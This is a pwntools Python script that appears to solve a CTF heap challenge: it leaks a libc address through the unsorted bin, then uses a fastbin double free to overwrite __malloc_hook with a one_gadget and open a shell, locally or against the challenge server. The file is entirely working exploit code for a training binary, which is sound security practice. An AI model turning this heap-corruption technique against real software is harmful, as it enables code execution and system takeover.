#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level5-unsortbin"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.sixstars.team", 22505)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()


def addnote(size):
    r.sendlineafter(">> ","1")
    r.sendlineafter("Size:",str(size))

def deletenote(nid):
    r.sendlineafter(">> ", "4")
    r.sendlineafter("Input your id:", str(nid))

def shownote(nid):
    r.sendlineafter(">> ","2")
    r.sendlineafter("Input your id:",str(nid))


def editnote(nid,content):
    r.sendlineafter(">> ","3")
    r.sendlineafter("Input your id:",str(nid))
    r.sendlineafter("Content:", content)

addnote(0x140) # 0
addnote(0x30) # 1
deletenote(0)
#addnote(0x100)
#editnote(1')
shownote(0)

w = r.recv(6)
main_arena_80_addr = u64(w + chr(0)*2)

print hex(main_arena_80_addr)
libc.address = main_arena_80_addr - (0x7ffff7dd1b78 - 0x7ffff7a0d000)
print hex(libc.address)



'''
1. get sth on unsorted bin, leak an address on libc。
2. double free revise malloc_hook
'''
addnote(0x68) #2
addnote(0x68) #3
deletenote(2)
deletenote(3)
deletenote(2)

one_gadget = libc.address + 0xf02a4

malloc_block = libc.sym['__malloc_hook'] -0x23 

addnote(0x68) #4
editnote(4,p64(malloc_block))
addnote(0x68) #5
addnote(0x68) #6
payload2 = 'a'*19 + p64(one_gadget)
addnote(0x68) #7
editnote(7,payload2)


deletenote(5)
deletenote(5)

r.interactive()
